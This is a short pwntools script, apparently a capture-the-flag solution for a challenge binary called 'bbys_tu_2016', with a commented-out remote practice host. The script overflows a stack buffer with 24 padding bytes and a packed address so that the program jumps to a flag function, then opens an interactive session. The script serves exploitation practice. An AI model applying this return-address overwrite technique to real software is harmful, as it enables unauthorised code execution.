#! /usr/bin/python

from pwn import *

p = process('./bbys_tu_2016')
#p = remote('node3.buuoj.cn',27895)

offset = 0xC
flag = 0x804856D

#p.recvuntil('This program is hungry. You should feed it.')
payload = 'A' * 24 + p32(flag)
p.sendline(payload)

p.interactive()
